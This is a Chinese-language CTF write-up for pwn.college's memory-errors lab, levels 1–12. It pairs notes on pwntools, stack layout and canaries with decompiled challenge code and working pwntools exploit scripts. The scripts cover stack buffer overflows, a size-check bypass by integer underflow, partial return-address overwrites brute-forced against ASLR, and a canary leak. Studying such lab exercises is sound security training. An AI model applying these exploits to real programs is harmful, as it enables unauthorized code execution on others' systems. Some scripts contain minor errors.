---
title: PWN-College-Shellcode-Injection-Writeup
date: 2024-07-30 11:02:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - 逆向
---
# pwn.college Memory


https://pwn.college/program-security/memory-errors/

## 值得记录的问题

### 1. python 中 pwn库 的使用

```python
output = p.recv()
output = p.recvuntil(b'Send')
output = p.recvall() # 只有这种方式会导致程序退出
output = p.recvline()

print(output)
if p.poll() is not None:  # 如果进程已经结束，poll() 将返回退出状态码
    print("Process has ended.")
else:
    print("Process is still running.")
exit()
```

在 pwntools 中，如果你调用 `p.recvall()`，它会尝试接收目标进程的所有输出数据，直到进程结束或达到指定的超时时间。然而，`p.recvall()` 并不会自动接收到之前已经产生但没有显式接收的输出数据。 p.recvall() 只会接收从调用时起存在的输出数据。

**理解数据接收**
在交互式程序中，如果你在前半部分没有调用 `p.recvline()`、`p.recv()` 等接收函数，且程序有输出数据，那么这些输出数据会被缓存在内部的接收缓冲区中。调用 `p.recvall()` 后，它会读取缓冲区中的所有数据，直到进程终止或达到超时。
因此，如果你在交互式过程中错过了某些输出数据（例如没有调用接收函数），调用 `p.recvall() `时仍然会接收这些数据（因为它们仍在缓冲区中），但是如果某些输出数据被丢弃或错过了（例如由于缓冲区溢出或其他原因），则无法恢复。

示例
```python
from pwn import *
p = process('/challenge/interact_program')

# 交互的前半部分，可能发送了一些输入但没有接收输出
p.sendline(b'first command')
# 假设程序输出了一些内容但没有调用 `p.recvline()` 进行接收

# 交互的后半部分，调用 `p.recvall()`
output = p.recvall(timeout=1).decode('utf-8')
print(output)
```

在上述示例中，如果在发送 `first command` 后，程序产生了一些输出而没有显式调用 `p.recvline()` 等函数接收，这些输出数据会在 `p.recvall() `调用时被接收，因为它们仍在缓冲区中。输出缓冲区：如果程序输出大量数据且未及时接收，可能会导致缓冲区溢出，丢失数据。交互性：在交互式程序中，确保在合适的时机接收和处理输出，以避免错过关键信息。总的来说，`p.recvall()`可以接收到调用前程序产生的所有未被处理的输出数据，但它只会接收从调用时刻起存在的所有数据。对于交互式程序，确保在每次交互后适当地接收输出数据是重要的，以免错过程序产生的重要输出。

#### 处理交互式程序的输出

**如果程序是交互式的，并且需要多次输入，那么在每次输入后立即调用 p.recvall() 或类似的阻塞方法（如 p.recvuntil()、p.recv() 等）可能会导致脚本卡住，因为这些方法通常会等待直到有数据可读或者达到超时时间。如果程序没有立即输出数据，脚本会一直等待。**

在处理需要多次输入的交互式程序时，通常使用如下几种方法：

1. 使用 p.recvline() 或 p.recvuntil()
这些方法可以接收一行数据或者直到特定的标志出现时停止。这对于读取预期的输出提示符或者阶段性信息非常有用。
```python
from pwn import *
p = process('/challenge/interact_program')
# 发送第一次输入
p.sendline(b'first command')
# 接收并处理第一次输出，假设我们知道它会输出一行结束
output = p.recvline()
print(output.decode())

# 发送第二次输入
p.sendline(b'second command')
# 接收并处理第二次输出，直到出现特定的提示符
output = p.recvuntil(b'expected prompt')
print(output.decode())
```
2. 设置超时
设置接收方法的超时时间，以避免程序长时间等待。这对处理未知长度的输出特别有用。
```python
from pwn import *
p = process('/challenge/interact_program')
# 发送第一次输入
p.sendline(b'first command')
# 尝试接收输出，设定超时
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("No more data, process may have ended.")
# s发送第二次输入
p.sendline(b'second command')
# 接收并处理第二次输出
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("No more data, process may have ended.")
```

3. 分步处理和条件判断
根据程序的交互过程，分步处理输入输出。对于每一步，判断是否有足够的输出数据来决定下一步操作。

```python
from pwn import *
p = process('/challenge/interact_program')

# 发送第一次输入
p.sendline(b'first command')
# 尝试接收部分输出
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("Process terminated unexpectedly.")

# 如果程序预期有多次输入输出循环，可以继续相同的模式处理
p.sendline(b'second command')
try:
    output = p.recv(timeout=2)
    print(output.decode())
except EOFError:
    print("Process terminated unexpectedly.")
```
4. 非阻塞模式
如果需要非阻塞地处理，可以使用 p.poll() 方法来检查进程状态，或者使用线程来处理 I/O。
```python
from pwn import *
p = process('/challenge/interact_program', stdout=PIPE, stderr=PIPE)
# 发送第一次输入
p.sendline(b'first command')
# 非阻塞地检查是否有输出
while True:
    if p.poll() is not None:
        break
    output = p.stdout.read()
    if output:
        print(output.decode())
```
总结
在处理交互式程序时，需要谨慎处理输入输出的时机和顺序。确保程序的每一步输出都能被正确读取，并且在预期没有输出时避免阻塞。这可以通过合适的接收方法（如 recvline()、recvuntil()）、超时机制、非阻塞 I/O 或者分步处理的方式来实现。

### 2.  Linux 命令

发现了一个很好的网站。有各种常用命令的讲解和使用案例。

[https://linuxtools-rst.readthedocs.io/zh-cn/latest/base/index.html](https://linuxtools-rst.readthedocs.io/zh-cn/latest/base/index.html)

### 3. 符号表

每个可重定位目标模块 m 都有一个符号表，它包含 m 定义和引用的符号的信息。在链接器的上下文中，有三种不同的符号：

- 由模块 m 定义并能被其他模块引用的全局符号。全局链接器符号对应于非静态的 C 函数和全局变量。
- 由其他模块定义并被模块 m 引用的全局符号。这些符号称为外部符号，对应于在其他模块中定义的非静态 C 函数和全局变量。
- 只被模块 m 定义和引用的局部符号。它们对应于带 static 属性的 C 函数和全局变量。这些符号在模块 m 中任何位置都可见，但是不能被其他模块引用。



| 名称   | 作用                                                         |
| ------ | ------------------------------------------------------------ |
| data段 | 通常是指用来存放程序中已初始化的全局变量的一块内存区域。     |
| bss段  | 通常是指用来存放程序中未初始化的全局变量的一块内存区域。bss是英文Block Started by Symbol的简称。 |
| text段 | 存放程序执行代码的一块内存区域                               |
| 堆     | 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。 |
| 栈     | 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。 |

### 4. canary保护机制

典型栈金丝雀（`Stack Canary`）是一种保护机制，用于检测和防止栈溢出攻击。金丝雀值通常存储在 `fs 段寄存器`指向的内存区域中。典型的做法是将金丝雀值存储在` fs:[0x28]` 这样的固定偏移位置上，函数在进入和退出时会对该值进行检查。

`fs 段寄存器`是 x86 和 x86-64 架构中的一个段寄存器，用于实现线程局部存储（Thread Local Storage, TLS）和其他与内存段相关的功能。在现代操作系统中，特别是在 64 位环境下，fs 段寄存器通常用于存储与线程和进程相关的重要数据结构，如线程控制块（Thread Control Block, TCB）和进程控制块（Process Control Block, PCB）。


栈金丝雀的值通常是随机的，操作系统在每次程序启动时会生成一个新的随机值，并将其存储在 `fs:28h`（或其他类似位置，具体取决于操作系统和编译器实现）处。

**在同一程序的生命周期内，如果没有特殊的重置或更改机制，fs:28h 的值通常保持不变。这意味着对于同一进程内的函数重复调用，栈金丝雀的值是一样的。**

还有一个特点，`canary`这个值的最低位通常是\x00开头的。栈金丝雀（canary）的最低位通常设置为 \x00，这是为了防止某些类型的缓冲区溢出攻击。这种设计有助于检测某些字符串复制函数（如 strcpy、strcat 等）未能正确处理缓冲区末尾的情况。这些函数通常会在遇到 \x00 时停止复制，因此在缓冲区溢出时，未能覆盖整个栈金丝雀的情况将更容易被检测到。


## level 1

第一关是个栈溢出的问题，理清楚栈结构就行。

```c
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-48h] BYREF
  void *buf; // [rsp+30h] [rbp-40h]
  _DWORD *v5; // [rsp+38h] [rbp-38h]
  __int64 v6[3]; // [rsp+40h] [rbp-30h] BYREF
  __int64 v7[3]; // [rsp+58h] [rbp-18h] BYREF

  v7[2] = __readfsqword(0x28u);
  memset(v6, 0, sizeof(v6));
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

栈结构，不知道为什么反汇编出来的`v5`是`v5= (_DWORD*)v7 + 1`。按照汇编语言来看的话`lea     rax, [rbp+var_30] \ add     rax, 1Ch \ mov     [rbp+var_38], rax`,应该是指向`0x1005C`大小为8个字节的数据。不知道为什么ida反编译的结果会跟v7联系起来。

```text
rsp\rbp --> 0x10000
        --> 0x10008
        --> 0x10010
        --> 0x10018  
        --> 0x10020
        --> 0x10028 
        --> 0x10030
        --> 0x10038 v5
        --> 0x10040 v6[0]  <-----buf
        --> 0x10048 v6[1]
        --> 0x10050 v6[2]
        --> 0x10058 v7[0]
                        0x1005C  <-----v5
        --> 0x10060 v7[1]
        --> 0x10068 v7[2]
rbp ------- 0x10070  old rbp
```

对应的结果跟上述描述一致，当输入超过28个字节的时候，可以显示flag。当输入等于28个字节的时候，不能显示flag。

```bash

hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1
###
### Welcome to ./babymem_level1.1!
###

Payload size: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Send your payload (up to 18446744073709551615 bytes)!
ERROR: Failed to read input -- Bad address!
hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1
###
### Welcome to ./babymem_level1.1!
###

Payload size: 28
Send your payload (up to 28 bytes)!
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Goodbye!

hacker@memory-errors~level1-1:~/memory/level1$ ./babymem_level1.1
###
### Welcome to ./babymem_level1.1!
###

Payload size: 29
Send your payload (up to 29 bytes)!
11111111111111111111111111111111111111111111111111111111111111111111111111111111
You win! Here is your flag:

  ERROR: Failed to open the flag -- Permission denied!
  Your effective user id is not 0!
  You must directly run the suid binary in order to have the correct permissions!
Goodbye!
```

## level 2

跟第一关的区别是，要把溢出的位置设置成某个十六进制数字`0x122925f0`。 关于变量反汇编又反汇编成`v5 = (_DWORD *)v7 + 1;`这样了，搜了一下，`_DWORD`是32位的，这样的话就对了，刚刚好是

```asm
.text:0000000000001E81 48 8D 45 E0                   lea     rax, [rbp+var_20] <----这里刚刚好是v6的地址
.text:0000000000001E85 48 83 C0 14                   add     rax, 14h          <----加20刚刚好是（int_32*）v7+1
.text:0000000000001E89 48 89 45 D8                   mov     [rbp+var_28], rax
```

```text
rsp\rbp --> 0x10000
        --> 0x10008
        --> 0x10010
        --> 0x10018  
        --> 0x10020
        --> 0x10028 
        --> 0x10030
        --> 0x10038 v5
        --> 0x10040 v6[0]  <-----buf
        --> 0x10048 v6[1]
        --> 0x10050 v7[0]
        --> 0x10058 v7[1]
       ..............
rbp ------- 0x10060  old rbp
```

```c
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-38h] BYREF
  void *buf; // [rsp+30h] [rbp-30h]
  _DWORD *v5; // [rsp+38h] [rbp-28h]
  __int64 v6[2]; // [rsp+40h] [rbp-20h] BYREF
  __int64 v7[2]; // [rsp+50h] [rbp-10h] BYREF

  v7[1] = __readfsqword(0x28u);
  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 == 0x773E1A11 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

## level 3

### 3.0

这一关是要将返回地址覆盖为win，3.0的程序是自带回显的。解释的已经很清楚了。

使用`objdump -t babymem_level3.0` 查询之后，win函数的地址是`0x0000000000401b15`

```asm
###
### Welcome to ./babymem_level3.0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc285f1e50 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e58 (rsp+0x0008) | f8 2f 5f 28 fc 7f 00 00 | 0x00007ffc285f2ff8 |
| 0x00007ffc285f1e60 (rsp+0x0010) | e8 2f 5f 28 fc 7f 00 00 | 0x00007ffc285f2fe8 |
| 0x00007ffc285f1e68 (rsp+0x0018) | a0 c6 58 b0 01 00 00 00 | 0x00000001b058c6a0 |
| 0x00007ffc285f1e70 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e78 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e80 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1e98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1ea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1ea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc285f1eb0 (rsp+0x0060) | d0 11 40 00 00 00 00 00 | 0x00000000004011d0 |
| 0x00007ffc285f1eb8 (rsp+0x0068) | 80 1e 5f 28 fc 7f 00 00 | 0x00007ffc285f1e80 |
| 0x00007ffc285f1ec0 (rsp+0x0070) | f0 2e 5f 28 fc 7f 00 00 | 0x00007ffc285f2ef0 |
| 0x00007ffc285f1ec8 (rsp+0x0078) | 41 22 40 00 00 00 00 00 | 0x0000000000402241 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc285f1e50, and our base pointer points to 0x7ffc285f1ec0.
This means that we have (decimal) 16 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 128 bytes.
The input buffer begins at 0x7ffc285f1e80, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 46 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc285f1ec8, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (46 to fill the buffer,
26 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

```

### 3.1 

3.1 这关没有回显。
反汇编之后，发现我们需要覆盖0x60（覆盖距离rbp的数据区域） + 8 个字节的数据（覆盖rbp数据），然后才是ret返回地址。 也就是一共112个字节的数据。

```python
binary_data = b'\x61'* 0x68 + b'\x82\x14\x40\x00\x00\x00\x00\x00'
```




## level 4

### 4.0 

相比之前的关卡，这一关在输入payloadsize之后，会增加一个校验。如果这个输入大于63字节的话，就会终止。是以有符号整数形式加载的。
```c
  if ( SLODWORD(nbytes[0]) > 63 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
```

但是在后续read函数读取的时候，`v9 = read(0, buf, LODWORD(nbytes[0]));`是以无符号整数的形式，调用的。所以我们可以传递一个负数，这样的话，就可以绕过检测。

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

p = process('/challenge/babymem_level4.0')

# 准备有效载荷
buffer_size = 88
win_func_address = p64(0x4022cb)  # 替换为实际地址

# 发送整数下溢值绕过大小检查
# p.sendlineafter("Payload size: ", "-1")
p.sendline("-1")

# 构造溢出并覆盖返回地址的有效载荷
payload = b'A' * buffer_size
payload += win_func_address
 
p.sendline(payload)
p.interactive()

```
### 4.1

以后要多用pwn编程，这样很快，不然后面的效率提不上来。

```python
from pwn import *

elf = ELF("/challenge/babymem_level4.1")
context.arch = 'amd64'
p = process("/challenge/babymem_level4.1")

p.sendline("-2")

buffer_size = 0x70
padding_rbp_size = 8  # rbp
win_func_address = p64(0x401fd2)
payload = b'A'*buffer_size + b'B'* padding_size + win_func_address
p.sendline(payload)

p.interactive()
```

## level 5

这一关在输入的地方，已经限制为无符号整数无法溢出。

但是在计算总大小的时候，两个32位的`usigned int`类型的整数相乘得到一个64位的整数。这个时候是可以溢出的。

### 5.0

```python
from pwn import *
elf = ELF("/challenge/babymem_level5.1")
context.arch = 'amd64'

p = process("/challenge/babymem_level5.1")
p.sendline("65536")
p.sendline("65536")

buffer_size = 0x48
win_func_address = p64(0x4018a4) # 地址查一下
payload = buffer_size * b'A' + win_func_address

p.sendline(payload)
p.interactive()
```

## level 6

这一关将校验的函数放在了win函数里，反而更方便了。因为覆盖返回的地址可以是任意地址，只需要跳过win函数的校验部分即可。

题目中说是要用objdump来分析，我直接用ida反汇编了。

```asm
.text:0000000000401C52 55                            push    rbp
.text:0000000000401C53 48 89 E5                      mov     rbp, rsp
.text:0000000000401C56 48 83 EC 10                   sub     rsp, 10h
.text:0000000000401C5A 89 7D FC                      mov     [rbp+var_4], edi
.text:0000000000401C5D 81 7D FC 37 13 00 00          cmp     [rbp+var_4], 1337h
.text:0000000000401C64 0F 85 F2 00 00 00             jnz     loc_401D5C
.text:0000000000401C64
直接跳转到这里就可以了-->.text:0000000000401C6A 48 8D 3D 7F 14 00 00          lea     rdi, aYouWinHereIsYo            ; "You win! Here is your flag:"
.text:0000000000401C71 E8 AA F4 FF FF                call    _puts
.text:0000000000401C71
```



## level 7

这一关，程序的加载基址是随机的，无法通过固定的地址跳转。但是页的大小是`0x1000`，这意味着最后三个十六进制的地址是固定的，可以通过覆盖返回地址的最后两个字节来实现跳转，至于第4个二进制数，只能靠多次运行猜测了。

这里要说一下，这个recv最多是一次性接受`nums`个字节，有一个上限，如果你不确定回显是否在这个范围内的话，最好还是用recvall，这个可以获取到所有的输出，直到`EOF`，但是它接受完之后，就会关闭`tube`。

```asm
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc02d5d290 (rsp+0x0000) | a0 d2 d5 02 fc 7f 00 00 | 0x00007ffc02d5d2a0 |
| 0x00007ffc02d5d298 (rsp+0x0008) | 88 e4 d5 02 fc 7f 00 00 | 0x00007ffc02d5e488 |
| 0x00007ffc02d5d2a0 (rsp+0x0010) | 78 e4 d5 02 fc 7f 00 00 | 0x00007ffc02d5e478 |
| 0x00007ffc02d5d2a8 (rsp+0x0018) | 00 3a ab 52 01 00 00 00 | 0x0000000152ab3a00 |
| 0x00007ffc02d5d2b0 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffc02d5d2b8 (rsp+0x0028) | 9a 00 00 00 00 00 00 00 | 0x000000000000009a |
| 0x00007ffc02d5d2c0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2c8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2d0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2d8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2e0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2e8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2f0 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d2f8 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d300 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d308 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d310 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d318 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d320 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d328 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d330 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d338 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d340 (rsp+0x00b0) | 41 41 41 41 9a 00 00 00 | 0x0000009a41414141 |
| 0x00007ffc02d5d348 (rsp+0x00b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d350 (rsp+0x00c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc02d5d358 (rsp+0x00c8) | 99 3e e5 1f 75 55 00 00 | 0x000055751fe53e99 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffc02d5d350
- the saved return address (previously to main) is at 0x7ffc02d5d358
- the saved return address is now pointing to 0x55751fe53e99.
- the address of win_authed() is 0x55751fe53e71.   <---- 这个3e71的3是会变化的

```

```python
from pwn import *



elf = ELF("/challenge/babymem_level7.0") 

p = process("/challenge/babymem_level7.0")
p.sendline("154")

buffer_size = 152
payload = buffer_size * b'A' + b'\x99\x3E'
p.sendline(payload)
output = p.recv().decode("utf-8")
p.interactive()

exit()

while True:

    elf = ELF("/challenge/babymem_level7.0") 

    p = process("/challenge/babymem_level7.0")
    p.sendline("154")

    buffer_size = 152
    payload = buffer_size * b'A' + b'\x99\x1E'
    p.sendline(payload)
    output = p.recvall().decode("utf-8")
    if "pwn" in output:
        print(output)
        p.interactive()
        exit()

```

```python
while True:

    elf = ELF("/challenge/babymem_level7.1") 

    p = process("/challenge/babymem_level7.1")
    p.sendline("90")

    buffer_size = 88
    payload = buffer_size * b'A' + b'\xAE\x22'
    p.sendline(payload)
    output = p.recvall().decode("utf-8")
    print(output)
    if "pwn" in output:
        print(output)
        exit()
```

## level 8

此关跟上level 7一致，多了一句strlen()判断字符串长度，我们直接将填充字节换成00这样，strlen的返回长度就是0。

```python
from pwn import *
context.arch = "amd64"
elf = ELF("/challenge/babymem_level8.0")
p = process("/challenge/babymem_level8.0")
p.sendline("74")

buffer_size = 72
payload = buffer_size * b'\x00' + b'\x95\x19'
p.sendline(payload)
p.interactive()
```

## level 9

这道题开启了栈保护，但我们能控制缓冲区溢出时写入的位置，只要我们跳过栈保护的随机值，直接覆盖返回地址，就不会出发栈保护。



```asm
.text:0000000000002684 B8 00 00 00 00                mov     eax, 0
.text:0000000000002689 48 8B 4D F8                   mov     rcx, [rbp+var_8] # var_8存储的是栈基址
.text:000000000000268D 64 48 33 0C 25 28 00 00 00    xor     rcx, fs:28h
.text:0000000000002696 74 05                         jz      short locret_269D
.text:0000000000002696
.text:0000000000002698 E8 C3 EA FF FF                call    ___stack_chk_fail

buffsize
00 00 00 00 n 00 00 00
变量1
金丝雀随机值
rbp
return返回地址

```

有一个需要注意的问题，就是发送的字节数。因为在循环的结束是小于之前输入的`v4`，所以你必须确保在覆盖掉返回地址的两个字节后，循环就要终止。所以向程序发送的`v4`，是` buffer 距离 return 的字节数 + 2`

```python
printf("Send your payload (up to %lu bytes)!\n", v4);
while ( *v6 < v4 )
{
    v0 = read(0, (char *)v5 + *v6, 1uLL);
    *v6 += v0;
}
```


```python

from pwn import *

elf = ELF("/challenge/babymem_level9.1")

while True:
    p = process("/challenge/babymem_level9.1")
    p.sendline("58")
    output = p.recvuntil("Send your payload (up to 58 bytes)!").decode("utf-8")

    i = 0 
    while i < (24 + 1) + 2: # 24 为buffer_size  2是覆盖的返回值字节数, 1是n变量
        print(f"send {i}th bytes")

        if i == 24:
            p.send(b'\x37')
        elif i == 26:
            p.send(b'\x1A')
        elif i == 25:
            p.send(b'\x76')
        else:
            p.send(b'\xBB')

        i += 1
    
    output = p.recvall().decode("utf-8")
    if "pwn" in output:
        print(output)
        exit()


elf = ELF("/challenge/babymem_level9.0")
while True:
    p = process("/challenge/babymem_level9.0")
    p.sendline("90")
    output = p.recvuntil("Send your payload (up to 90 bytes)!").decode("utf-8")
    print(output)

    i = 0 
    while i < 64  + 4 + 2 + 1: # 64 为buffer_size , 4是n变量前面的空字节数, 2是覆盖的返回值字节数, 1是n变量
        if i == 64 + 4:
            p.send(b'\x57')
        elif i == 70:
            p.send(b'\x1c')
        elif i == 69:
            p.send(b'\x62')
        else:
            p.send(b'\xBB')
        i += 1

    p.interactive()
    output = p.recvall().decode("utf-8")
    if "pwn" in output:
        print(output)
        exit()
```

## level 10

这一关，程序将`flag`文件的内容读取到了内存中，而且最后有`puts()`函数负责打印`buf`缓冲区中的内容，所以我们只需要填充flag具体内容之前的部分为`A`即可。注意不要发送`\x00`，这样`puts()`打印时，会将之前存储在`buf`中的`flag`一起打印出来。

```asm

-0x180 ---> &buffer
-0x188 ---> &flag
-0x180 ---> buf   输入的字符串



-0x180 + 0x6B --> flag的具体内容

0x000 ----> 旧的rbp指针  

```


```python
from pwn import *

elf = ELF("/challenge/babymem_level10.0")

p = process("/challenge/babymem_level10.0")
p.sendline("107")

buffer_size = 107
payload = buffer_size * b'A'
p.send(payload)
p.interactive()
```

## level 11

这一关跟上一关一样。唯一不同的是，之前缓冲区是在栈空间上的，现在使用`mmap`(Memory Mapped File)将文件内容映射到进程的地址空间，从而可以像访问内存一样访问文件内容。通过这种方式，可以非常高效地对文件进行操作，特别适用于需要频繁读写大文件的场景。`mmap` 创建的内存映射区域可以被多个进程共享，所以当一个进程修改了映射区域的内容，其他进程可以立即看到这些修改。

当一个进程多次调用` mmap `来创建内存映射区域时，每次调用都会在进程的虚拟地址空间中分配一个新的内存区域，并返回这个区域的起始地址。如果这些内存区域不被解除映射 `(munmap)`，它们将一直存在于进程的地址空间中，直到进程结束。


另外，如果你要求的大小小于0x1000(4096)，通常，mmap 分配的地址会满足页面对齐要求（例如，4KB 页对齐）。所以它可能还是会分配0x1000的大小。

```c
 for ( i = 0; i <= 6; ++i )
    v7 = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
  buf = mmap(0LL, 0x11uLL, 3, 34, 0, 0LL); // 这里buf的大小还是0x1000
```

```asm
Called mmap(0, 0x1000, 4, MAP_SHARED, open("/flag", 0), 0) = 0x7f795e195000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e194000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e193000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e192000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e191000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e190000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e18f000
Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e18e000
Memory mapping the input buffer...
Called mmap(0, 82, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e18d000
```

所以只需要把payload设置成0x1000*8就行。

```python
from pwn import *

elf = ELF("/challenge/babymem_level11.0")
p = process("/challenge/babymem_level11.0")
buffer_size = 0x1000 * 8
p.sendline(f"{buffer_size}")
payload = buffer_size * "A"
p.send(payload)
p.interactive()
```

## level 12

这一关开启canary保护，不能直接通过缓冲区溢出复写返回地址，因为这样一定会覆盖掉canary的校验值，导致程序后续运行失败。

但是通过反编译以后发现，存在`challenge`的重复调用，这就意味着，我们可以通过第一次challenge的调用后`puts()`打印的回显，获取canary的值。然后在第二次调用中，复写函数的返回地址。这样，在知道`cannary`值的前提下， 不会触发段溢出的报错。还是跟之前一样，因为不是position independent，所以只复写两个字节，然后重试。

```c
  if ( strstr((const char *)buf, "REPEAT") )
  {
    puts("Backdoor triggered! Repeating challenge()");
    return challenge(v9, v8, v7); 
  }
  else
  {
    puts("Goodbye!");
    return 0LL;
  }
```


```python
from pwn import *

elf = ELF("/challenge/babymem_level12.1")
p = process("/challenge/babymem_level12.1")
buffer_size = 0x68 + 1                      # 1 是为了填补canary最低位的0x00
p.sendline(f"{buffer_size}")
p.send(b'REPEAT' +  b'A' * (0x68 - 6 + 1))  # 6 是REPEAT所占的字节数
output = p.recvall()
print(output)
